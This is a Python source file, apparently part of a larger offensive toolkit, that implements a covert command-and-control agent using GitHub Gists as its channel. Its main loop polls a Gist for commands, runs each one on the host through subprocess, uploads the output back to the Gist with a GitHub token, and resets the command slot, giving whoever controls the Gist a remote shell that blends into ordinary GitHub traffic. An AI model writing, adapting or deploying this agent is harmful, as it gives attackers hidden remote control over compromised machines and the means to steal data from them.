import requests
import json
import logging
import time
from .c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME

GIST_API_URL = "https://api.github.com/gists"

def get_gist_content(gist_id, filename=None):
    """
    Retrieves the content of a specific file in a Gist.
    If no filename is provided, it returns the content of the first file.
    """
    try:
        response = requests.get(f"{GIST_API_URL}/{gist_id}")
        if response.status_code == 200:
            gist_data = response.json()
            files = gist_data.get('files', {})
            if not files:
                logging.error(f"Gist {gist_id} has no files.")
                return None

            if filename:
                if filename in files:
                    return files[filename]['content']
                else:
                    # Log that the specific file was not found, but don't treat as a fatal error
                    logging.warning(f"File '{filename}' not found in Gist {gist_id}.")
                    return None
            else:
                # Fallback to original behavior
                first_filename = list(files.keys())[0]
                return files[first_filename]['content']
        else:
            logging.error(f"Failed to get Gist {gist_id}. Status: {response.status_code}")
            return None
    except Exception as e:
        logging.error(f"Error getting Gist content for {gist_id}: {e}")
        return None

def update_gist(gist_id, filename, content, github_token):
    """Updates a specific file in a Gist."""
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json",
    }
    data = {
        "files": {
            filename: {
                "content": content
            }
        }
    }
    try:
        response = requests.patch(f"{GIST_API_URL}/{gist_id}", headers=headers, json=data)
        if response.status_code == 200:
            logging.info(f"Gist {gist_id} updated successfully.")
            return True
        else:
            logging.error(f"Failed to update Gist {gist_id}. Status: {response.status_code}, Response: {response.text}")
            return False
    except Exception as e:
        logging.error(f"Error updating Gist: {e}")
        return False

def lotl_agent(gist_id, github_token, sleep_interval=60):
    """
    The main loop for the LOTL C2 agent using GitHub Gists.
    """
    logging.info(f"LOTL C2 agent started. Polling Gist ID: {gist_id}")

    while True:
        try:
            command = get_gist_content(gist_id, COMMAND_FILENAME)
            if command and command.strip() != "waiting...":
                logging.info(f"Received command: {command}")

                import subprocess
                output = subprocess.getoutput(command)

                # Ensure output is not empty, provide a default value if it is.
                if not output.strip():
                    output = "<no output>"

                # Agent writes to the output file
                update_gist(gist_id, OUTPUT_FILENAME, output, github_token)
                # Agent resets the command file
                update_gist(gist_id, COMMAND_FILENAME, "waiting...", github_token)

            else:
                logging.info("No new command found. Sleeping.")

        except Exception as e:
            logging.error(f"Error in LOTL agent loop: {e}")

        time.sleep(sleep_interval)